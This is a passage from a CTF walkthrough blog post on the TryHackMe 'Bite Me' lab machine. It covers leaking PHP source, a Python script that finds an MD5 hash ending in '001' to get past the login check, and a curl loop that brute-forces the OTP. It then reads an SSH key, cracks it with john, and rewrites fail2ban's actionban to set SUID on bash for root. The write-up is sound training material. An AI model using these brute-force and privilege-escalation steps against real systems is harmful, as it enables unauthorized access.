</pre></table></code></div></div></ol><p>So what the code is doing that, if any user clicks on the <strong>submit</strong> button of the login page, the <strong>handleSubmit()</strong> function will log a message in the <strong>developer console</strong>. From here we got some information.</p><ol><li>We have 2 users: <strong>fred</strong> and <strong>jason</strong><li>and there is some kind of <strong>php syntax highligher</strong> is present on the server.</ol><h3 id="viewing-source-code">Viewing Source Code</h3><p>If we can somehow pass the <strong>index.php</strong> page to the <strong>php syntax highlighter</strong>, we can apparently see the actual source code, which is running on the server side. Let‚Äôs enumerate further and see if we can do that or we have to take any other path.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317200824.png" alt="" /></p><ol><li>Searching on google for <strong>php syntax highlighter</strong>, headed to the <strong>php docs</strong>.<li>Here is the <strong>syntax highlighting</strong> function, which take a <strong>php</strong> file.<li>We can pass a file with <strong>.phps</strong> for syntax highlighting.</ol><p>So here we requested <strong>/index.php</strong> using <strong>.phps</strong> extensions and voila, we got the php code <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317203116.png" alt="" /> So this is the <strong>index.php</strong> code, which isn‚Äôt much</p><ol><li><strong>index.php</strong> php code<li>Getting data from the login form, if submit button is clicked<li>Generating the <strong>captcha code</strong> and calling the <strong>mfa.php</strong> file, which might be interesting for us.</ol><h3 id="bypassing-login-form">Bypassing Login Form</h3><h4 id="finding-username">Finding username</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317214805.png" alt="" /> here‚Äôs the <strong>functions.php</strong> file‚Äôs content</p><ol><li>Source code of the <strong>functions.php</strong> file<li><p>We can see <strong>LOGIN_USER</strong> variable is used in the login functions, which is passed from the <strong>config.php</strong> file. As we can see that, <strong>$user</strong> variable‚Äôs value is passed via <strong>bin2hex</strong> function, which is used to convert the <strong>hex</strong> data into <strong>binary ascii</strong> data.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317215235.png" alt="" /></p><ol><li>Here the value of <strong>LOGIN_USER</strong> from <strong>config.php</strong> file, which is in the <strong>hex</strong> form. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317215433.png" alt="" /> here the decoded form the <strong>LOGIN_USER</strong>. so we have the login user <strong>jason_test_account</strong>.</ol><li>From the <strong>is_valid_pwd()</strong> function, so the function is first retrieving the password entered in the form, converting it in <strong>md5</strong> hash, and checking if the last 3 characters is equal to <strong>001</strong></ol><h4 id="generating-password">Generating Password</h4><p>So for bypassing the login panel, we have the <strong>username</strong> and for the password, we have to generate any <strong>md5</strong> hash which ends with <strong>001</strong>. So let‚Äôs write a script for doing so.</p><p>genpass.py</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_lowercase</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="n">counter</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">combinations</span> <span class="o">=</span> <span class="n">itertools</span><span class="p">.</span><span class="n">combinations_with_replacement</span><span class="p">(</span>
        <span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">r</span><span class="o">=</span><span class="n">counter</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">:</span>
        <span class="n">string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

        <span class="n">m</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
        <span class="n">the_hash</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">the_hash</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'001'</span><span class="p">)):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"{}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">the_hash</span><span class="p">))</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317220610.png" alt="" /></p><p>So here‚Äôs is a python script for generating a random hash which ends with <strong>001</strong>, as required for bypassing the login form. By now we already have the username and now we also have the password, so let‚Äôs check if we login or not.</p><h4 id="bypassing-otp-verification">Bypassing OTP Verification</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317221025.png" alt="" /> Yay!, we successfully bypassed the login form, but we have another thing to bypass, someking of <strong>OTP</strong> is required to bypass the form.</p><p>By checking the source code of the <strong>/console/mfa.php</strong> endpoint <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317221239.png" alt="" /> we got another javascript deobfuscated code, which is readable.</p><ol><li>It logs the message in the console</ol><p>So from the image above we know that, we can simply bruteforce the <strong>OTP</strong> to bypass the form. Let‚Äôs do it. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317230647.png" alt="" /></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0000..9999<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"code=</span><span class="nv">$i</span><span class="s2">"</span> 10.10.95.146/console/mfa.php <span class="nt">--cookie</span> <span class="s2">"user=jason_test_account; pwd=xxxxx"</span> | <span class="nb">wc</span> <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"23"</span><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nb">echo </span>FOUND IT!<span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>So here‚Äôs the oneliner using which, we can apparently bypass the <strong>OTP</strong> verification.</p><p>and Voila, we are successfully logged in.</p><h4 id="user-flag">User Flag</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317232659.png" alt="" /> After logging in, we got 2 tabs, a <strong>File Browser</strong> using which, we can list the files and a <strong>File Viewer</strong> using that, we can read any file, which we have permission to, obviously. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317233054.png" alt="" /> In the <strong>jason</strong> user‚Äôs home directory, we found following files. contents of <strong>/home/jason</strong> directory.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317233335.png" alt="" /> and here we got the <strong>user flag</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317233615.png" alt="" /></p><ol><li>Here we have the <strong>/home/jason/.ssh</strong> directory<li>we have the <strong>id_rsa</strong>, which we can use to get shell as user <strong>jason</strong> on the system.</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317234033.png" alt="" /></p><ol><li>Accessing the <strong>/home/jason/.ssh/id_rsa</strong> file<li>Here‚Äôs the contents of the <strong>id_rsa</strong> file</ol><h1 id="initial-access">Initial Access</h1><h2 id="getting-user-shell">Getting User Shell</h2><p>Now that we have the <strong>id_rsa</strong> file or <strong>private ssh key</strong> of the user <strong>jason</strong>, we can try login using the file. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317235120.png" alt="" /></p><ol><li><strong>jason</strong> user‚Äôs <strong>private ssh key</strong> file<li>Changing the permission of the file, so we can use it.<li>Trying to ssh into the machine using the <strong>ssh key</strong><li>and Here we are asked for the <strong>jason</strong>‚Äôs password which we don‚Äôt know.</ol><h3 id="cracking-the-hash">Cracking the hash</h3><p>But we do have the <strong>ssh key</strong>, which we can pass to <strong>johntheripper</strong> and crack the password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220317235956.png" alt="" /></p><ol><li>Converting the file in a format that <strong>john</strong> can use<li>Cracking the hash with <strong>john</strong><li>And here we got the password.</ol><p>Now Let‚Äôs Try and Login with the password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318000236.png" alt="" /></p><ol><li>Trying to log into the server via ssh using private key and password<li>Logged in as user <strong>jason</strong></ol><p>And here we got the shell as user <strong>jason</strong></p><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="horizontal-privilege-escalation">Horizontal Privilege Escalation</h3><p>Checking the sudo capibilities of the user <strong>jason</strong>, we found that we can run any command on the system as user <strong>fred</strong> using the <strong>sudo</strong> command.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318000453.png" alt="" /></p><ol><li>Checking <strong>sudo</strong> permissions<li>Found that we can run any command as user <strong>fred</strong> using <strong>sudo</strong><li>Executing <strong>bash</strong> as user <strong>fred</strong> using <strong>sudo</strong><li>And here we have the shell as user <strong>fred</strong></ol><h3 id="getting-root-access">Getting Root Access</h3><h4 id="checking-for-sudo-privileges">Checking for sudo privileges</h4><p>Again checking for <strong>sudo</strong> permissions that we have as <strong>fred</strong>, found that we can restart <strong>fail2ban</strong> using <strong>systemctl</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318000938.png" alt="" /></p><ol><li>Checking the <strong>sudo</strong> permissions<li>we can run <strong>/bin/systemctl restart fail2ban</strong> as <strong>root</strong> without password.</ol><p>So we can restart <strong>fail2ban</strong> using <strong>systemctl</strong>. Let‚Äôs check if we can somehow abuse this to get a root shell. for those who don‚Äôt know what <strong>fail2ban</strong> is:</p><blockquote><p>Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks.</p></blockquote><p>After researching for a while, we found that, we can write any configuration files of the <strong>fail2ban</strong> service, we can modify the configurations and get a shell as root. Let‚Äôs check if we have write permissions for any of the configuration files of the <strong>fail2ban</strong> service.</p><h4 id="abusing-fail2ban-to-get-root-shell">Abusing fail2ban to get root shell</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318002554.png" alt="" /> So as we can see from the above image, that we have <strong>write</strong> permission to <strong>/etc/fail2ban/action.d</strong> directory</p><ol><li>Finding files with <strong>write</strong> permission enabled<li>Found <strong>/etc/fail2ban/action.d</strong> with enabled <strong>write</strong> permission</ol><p>Let‚Äôs check if we can modify any of the configuration files.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318002823.png" alt="" /></p><ol><li>Here we can see that <strong>iptables-multiport.conf</strong> file is owned by the <strong>fred</strong> user, which we can abuse to get a root shell on the system.</ol><p>Modifing the <strong>iptables-multiport.conf</strong> file for getting root access.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318003446.png" alt="" /></p><ol><li>Replaced the origin <strong>actionban</strong> command to our own.<li>Replaced the origin <strong>actionunban</strong> command to execute our own command.</ol><p>So what this will do is, if we will try to bruteforce the <strong>ssh</strong> then if enough attempts is failed then the <strong>fail2ban</strong> service will execute the specified command in <strong>actionban</strong> from the <strong>iptables-multiport.conf</strong> file.</p><p>So let‚Äôs restart the <strong>fail2ban</strong> service, we have the <strong>sudo</strong> privilege to do that, and try bruteforcing the <strong>ssh</strong> in order to get a root shell.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318004405.png" alt="" /></p><ol><li>Restarting the <strong>fail2ban</strong> service to load our modified configurations.<li>Bruteforcing <strong>ssh</strong> in order to make <strong>fail2ban</strong> to invoke the <strong>actionban</strong><li>Checking the <strong>/bin/bash</strong> for <strong>SUID</strong> bit<li>And here, we have a <strong>SUID</strong> bit set to the <strong>/bin/bash</strong> binary</ol><h4 id="root-shell">Root Shell</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/biteme/Pasted image 20220318004833.png" alt="" /></p><ol><li>Invoking the <strong>SUID</strong> bit of the <strong>/bin/bash</strong> binary<li>Got shell as <strong>root</strong> user<li>Reading the root flag</ol><p>So here we completed our machine, hope you all liked it. Thanks for reading and don‚Äôt forget to share if you liked, and we will see you again until then <strong>Keep Calm and Keep Hacking :)</strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="/tags/security/" class="post-tag no-text-decoration" >Security</a> <a href="/tags/fail2ban/" class="post-tag no-text-decoration" >fail2ban</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/python3/" class="post-tag no-text-decoration" >python3</a> <a href="/tags/bruteforce/" class="post-tag no-text-decoration" >bruteforce</a> <a href="/tags/feroxbuster/" class="post-tag no-text-decoration" >feroxbuster</a> <a href="/tags/thehackersbrain/" class="post-tag no-text-decoration" >thehackersbrain</a> <a href="/tags/gauravraj/" class="post-tag no-text-decoration" >gauravraj</a> <a href="/tags/gaurav-raj/" class="post-tag no-text-decoration" >gaurav raj</a> <a href="/tags/gaurav/" class="post-tag no-text-decoration" >gaurav</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/setuid/" class="post-tag no-text-decoration" >setuid</a> <a href="/tags/curl/" class="post-tag no-text-decoration" >curl</a> <a href="/tags/priv-esc/" class="post-tag no-text-decoration" >Priv-Esc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bite Me TryHackMe Detailed Writeup and Walkthrough - Gaurav Raj&url=https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="whatsapp://send?text=https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Whatsapp" target="_blank" rel="noopener" aria-label="Whatsapp"> <i class="fa-fw fab fa-whatsapp-square"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bite Me TryHackMe Detailed Writeup and Walkthrough - Gaurav Raj&u=https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Bite Me TryHackMe Detailed Writeup and Walkthrough - Gaurav Raj&url=https://blog.gauravraj.xyz/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ohmywebserver-tryhackme-writeup-and-walkthrough/">Oh My WebServer TryHackMe Machine Writeup and Walkthrough</a><li><a href="/posts/Plugins-With-vim-plug-in-Neovim/">Plugins with vim-plug in NeoVim</a><li><a href="/posts/troll-2-vulnhub-machine-writeup-and-walkthrough/">Troll 2 Vunhub Machine Writeup and Walkthrough</a><li><a href="/posts/dns-in-detail-tryhackme-machine-writeup-and-walkthrough/">DNS in Detail TryHackMe Machine Writeup and Walkthrough</a><li><a href="/posts/vulnnet-internal-tryhackme-machine-writeup-and-walkthough-detailed/">Vulnnet Internal TryHackMe Machine Writeup and Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thehackersbrain/">thehackersbrain</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/gaurav-raj/">gaurav raj</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div><div class='jekyll-twitter-plugin' align='center'><div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="500" data-tweet-limit="2" href="https://twitter.com/thehackersbrain?ref_src=twsrc%5Etfw">Tweets by thehackersbrain</a> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PlottedCMS-TryHackMe-Writeup-and-Walkthrough/"><div class="card-body"> <span class="timeago small" > Feb 22 <i class="unloaded">2022-02-22T15:40:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PlottedCMS TryHackMe Machine Writeup and Walkthrough</h3><div class="text-muted small"><p> Introduction TryHackMe Easy Level Machine Target export IP=10.10.230.183 Enumeration First of all let‚Äôs start by running our Nmap Scan Nmap # Nmap 7.92 scan initiated Sat Feb 19 14:01:4...</p></div></div></a></div><div class="card"> <a href="/posts/troll-vulnhub-machine-writeup-and-walkthrough/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T11:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Troll Vunhub Machine Writeup and Walkthrough</h3><div class="text-muted small"><p> Troll: 1 OSCP Labs inspired machine on VulnHub Description Tr0ll was inspired by the constant trolling of the machines within the OSCP labs. The goal is simple, gain root and get Proof.txt fro...</p></div></div></a></div><div class="card"> <a href="/posts/troll-2-vulnhub-machine-writeup-and-walkthrough/"><div class="card-body"> <span class="timeago small" > Jun 26, 2021 <i class="unloaded">2021-06-26T15:15:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Troll 2 Vunhub Machine Writeup and Walkthrough</h3><div class="text-muted small"><p> Troll: 2 OSCP Labs Inspired Machine on Vulnhub Configuration Extracted the Tr0ll2.rar file and then opened it as a new machine in VM Ware Player and the network configuration is Bridged Networ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ohmywebserver-tryhackme-writeup-and-walkthrough/" class="btn btn-outline-primary" prompt="Older"><p>Oh My WebServer TryHackMe Machine Writeup and Walkthrough</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/thehackersbrain">Gaurav Raj</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://gauravraj.tech/" target="_blank" rel="noopener">Gaurav Raj</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thehackersbrain/">thehackersbrain</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/gaurav-raj/">gaurav raj</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blog.gauravraj.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
